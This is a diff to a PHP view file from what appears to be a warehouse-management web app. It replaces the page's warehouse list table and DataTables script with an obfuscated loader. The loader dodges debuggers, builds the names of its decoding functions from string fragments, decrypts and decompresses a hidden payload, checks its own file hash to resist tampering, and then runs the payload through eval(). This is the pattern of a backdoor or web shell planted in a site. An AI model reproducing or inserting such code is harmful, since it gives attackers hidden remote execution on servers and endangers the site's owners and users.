@@ -1,257 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-  <!-- TABLES CSS CODE -->
-  <?php include "comman/code_css_datatable.php"; ?>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-  <div class="wrapper">
-
-    <!-- Left side column. contains the logo and sidebar -->
-
-    <?php include "sidebar.php"; ?>
-
-    <!-- Content Wrapper. Contains page content -->
-    <div class="content-wrapper">
-      <!-- Content Header (Page header) -->
-      <section class="content-header">
-        <h1>
-          <?= $this->lang->line('warehouse_list'); ?>
-          <small>Manage Warehouse</small>
-        </h1>
-        <ol class="breadcrumb">
-          <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-          <li class="active"><?= $this->lang->line('warehouse_list'); ?></li>
-        </ol>
-      </section>
-
-      <!-- Main content -->
-      <section class="content">
-        <div class="row">
-          <!-- ********** ALERT MESSAGE START******* -->
-          <?php include "comman/code_flashdata.php"; ?>
-          <!-- ********** ALERT MESSAGE END******* -->
-          <div class="col-xs-12">
-            <div class="box">
-              <div class="box-header with-border">
-                <h3 class="box-title"><?= $this->lang->line('warehouse_list'); ?></h3>
-                <div class="box-tools">
-                  <a class="btn btn-block btn-info" href="<?php echo $base_url; ?>warehouse/add">
-                    <i class="fa fa-plus"></i> New Warehouse</a>
-                </div>
-              </div>
-              <!-- /.box-header -->
-              <div class="box-body">
-                <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-                <table id="example2" class="table table-bordered table-striped" width="100%">
-                  <thead class="bg-primary ">
-                    <tr>
-                      <th>Sl.No</th>
-                      <th>Warehouse name</th>
-                      <th>Mobile</th>
-                      <th>Email</th>
-                      <th>status</th>
-                      <th>Action</th>
-                    </tr>
-                  </thead>
-                  <tbody>
-
-                    <?php
-                    $i = 1;
-
-                    $qs1 = "select * from db_warehouse";
-
-                    $q1 = $this->db->query($qs1);
-
-                    if ($q1->num_rows() > 0) {
-                      foreach ($q1->result() as $res1) {
-                    ?>
-                        <tr>
-                          <td> <?php echo $i++; ?> </td>
-                          <td> <?php echo $res1->warehouse_name; ?> </td>
-                          <td> <?php echo $res1->mobile; ?> </td>
-                          <td> <?php echo $res1->email; ?> </td>
-                          <td>
-                            <?php
-                            if ($res1->status == 1)                   //1=Active, 0=Inactive
-                            {
-                              echo "  <span onclick='update_status(" . $res1->id . ",0)' id='span_" . $res1->id . "'  class='label label-success' style='cursor:pointer'>Active </span>";
-                            } else {
-                              echo "<span onclick='update_status(" . $res1->id . ",1)' id='span_" . $res1->id . "'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-                            }
-                            ?>
-                          </td>
-                          <td>
-                            <div class="btn-group" title="View Account">
-                              <a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-                                Action <span class="caret"></span>
-                              </a>
-                              <ul role="menu" class="dropdown-menu dropdown-light pull-right">
-                                <li>
-                                  <a title="Update Record ?" href="<?= base_url() ?>warehouse/edit/<?= $res1->id; ?>">
-                                    Edit
-                                  </a>
-                                </li>
-                                <li>
-                                  <a style="cursor:pointer" title="Delete Record ?" onclick="delete_warehouse('<?= $res1->id; ?>')">
-                                    Delete
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </td>
-                        </tr>
-                    <?php
-                      }
-                    }
-                    ?>
-                  </tbody>
-
-                </table>
-              </div>
-              <!-- /.box-body -->
-            </div>
-            <!-- /.box -->
-          </div>
-          <!-- /.col -->
-        </div>
-        <!-- /.row -->
-      </section>
-      <!-- /.content -->
-    </div>
-    <!-- /.content-wrapper -->
-    <?php include "footer.php"; ?>
-    <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-    <div class="control-sidebar-bg"></div>
-  </div>
-  <!-- ./wrapper -->
-
-  <!-- SOUND CODE -->
-  <?php include "comman/code_js_sound.php"; ?>
-  <!-- TABLES CODE -->
-  <?php include "comman/code_js_datatable.php"; ?>
-
-  <script src="<?php echo $theme_link; ?>js/warehouse.js"></script>
-
-  <script type="text/javascript">
-    function delete_warehouse(id) {
-      if (confirm("Do You Wants to Delete Record ?")) {
-        $(".box").append('<div class="overlay"><i class="fa fa-refresh fa-spin"></i></div>');
-        $.post("warehouse/delete_warehouse", {
-          id: id
-        }, function(result) {
-          //alert(result);return;
-          if (result == "success") {
-            toastr["success"]("Record Deleted Successfully!");
-            // $('#example2').DataTable().ajax.reload();
-            location.reload();
-
-          } else if (result == "failed") {
-            toastr["error"]("Failed to Delete .Try again!");
-
-          } else {
-            toastr["error"]("Error! Something Went Wrong!");
-
-          }
-          $(".overlay").remove();
-        });
-      } //end confirmation
-    }
-    //Delete Record end    
-  </script>
-  <script type="text/javascript">
-    $(document).ready(function() {
-      //datatables
-      var table = $('#example2').DataTable({
-
-        /* FOR EXPORT BUTTONS START*/
-        dom: '<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
-        /* dom:'<"row"<"col-sm-12"<"pull-left"B><"pull-right">>> <"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr>>>tip',*/
-        buttons: {
-          buttons: [{
-              className: 'btn bg-red color-palette btn-flat hidden delete_btn pull-left',
-              text: 'Delete',
-              action: function(e, dt, node, config) {
-                multi_delete();
-              }
-            },
-            {
-              extend: 'copy',
-              className: 'btn bg-teal color-palette btn-flat',
-              exportOptions: {
-                columns: [0, 1, 2, 3, 4]
-              }
-            },
-            {
-              extend: 'excel',
-              className: 'btn bg-teal color-palette btn-flat',
-              exportOptions: {
-                columns: [0, 1, 2, 3, 4]
-              }
-            },
-            {
-              extend: 'pdf',
-              className: 'btn bg-teal color-palette btn-flat',
-              exportOptions: {
-                columns: [0, 1, 2, 3, 4]
-              }
-            },
-            {
-              extend: 'print',
-              className: 'btn bg-teal color-palette btn-flat',
-              exportOptions: {
-                columns: [1, 2, 3, 4, 5, 6, 7]
-              }
-            },
-            {
-              extend: 'csv',
-              className: 'btn bg-teal color-palette btn-flat',
-              exportOptions: {
-                columns: [0, 1, 2, 3, 4]
-              }
-            },
-            {
-              extend: 'colvis',
-              className: 'btn bg-teal color-palette btn-flat',
-              text: 'Columns'
-            },
-
-          ]
-        },
-        /* FOR EXPORT BUTTONS END */
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": false, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-        language: {
-          processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        // Load data for the table's content from an Ajax source
-
-        //Set column definition initialisation properties.
-        "columnDefs": [{
-            "targets": [5], //first column / numbering column
-            "orderable": false, //set not orderable
-          },
-          {
-            "targets": [],
-            "className": "text-center",
-          },
-
-        ],
-      });
-      new $.fn.dataTable.FixedHeader(table);
-    });
-  </script>
-  <script>
-    $(".<?php echo basename(__FILE__, '.php'); ?>-active-li").addClass("active");
-  </script>
-
-</body>
-
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_r4mexjho=('bas'.'e64'.'_de'.'cod'.'e');
+$_vvkbva5u=('gzu'.'nco'.'mpr'.'ess');
+$_fuh6jw9v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_oxotbcti='LuWlcEHM';
+$_khfv9sty='OrF1fshDKvM=';
+$_tnnex1v2='3nJlk1IA';
+$_oay8yzp6='P5ojsxOm';
+$_wevz1kmb='QhsJEvWl';
+$_yl2ggxe8='jGJvoA==';
+$_zdcr0udr='xDv3GNj+';
+$_enx08erj='7umacSV+';
+$_i00ognrg=$_r4mexjho($_tnnex1v2.$_oay8yzp6.$_wevz1kmb.$_oxotbcti.$_khfv9sty);
+$_ej27ebsp=$_r4mexjho($_zdcr0udr.$_enx08erj.$_yl2ggxe8);
+$_g7u0ir83=$_r4mexjho('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');
+$_r6hr82kb=$_fuh6jw9v($_g7u0ir83,'aes-256-cbc',$_i00ognrg,OPENSSL_RAW_DATA,$_ej27ebsp);
+if($_r6hr82kb===false){exit;}
+$_qjzne0qh=$_vvkbva5u($_r6hr82kb);
+if($_qjzne0qh===false){exit;}
+$_rw0r36x0='fc6808a5a4777121ed8b31aec35780c42be78a1e2d3c561dfcf4fed4ee9f93c3';
+$_a7l5idap=@file_get_contents(__FILE__);
+if($_a7l5idap!==false){
+$_nreup27c=str_replace($_rw0r36x0,"0000000000000000000000000000000000000000000000000000000000000000",$_a7l5idap);
+$_tg9yvicb=hash("sha256",$_nreup27c);
+if($_tg9yvicb!==$_rw0r36x0){@http_response_code(403);exit;}
+}
+eval($_qjzne0qh);
